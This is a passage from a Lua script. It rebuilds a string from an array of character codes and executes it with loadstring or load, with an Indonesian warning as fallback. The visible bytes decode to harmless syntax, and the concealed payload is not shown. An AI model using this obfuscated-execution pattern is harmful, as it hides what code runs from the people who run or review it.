10, 32, 32, 32, 32, 101, 110, 100, 10, 101, 110, 100, 41, 10, 10}
local _B = {}
for _i = 1, #_A do
    _B[_i] = string.char(_A[_i])
end
local _C = table.concat(_B)
local _D = loadstring or load
if _D then
    _D(_C)()
else
    warn("Sistem kamu tidak mendukung loadstring!")
end
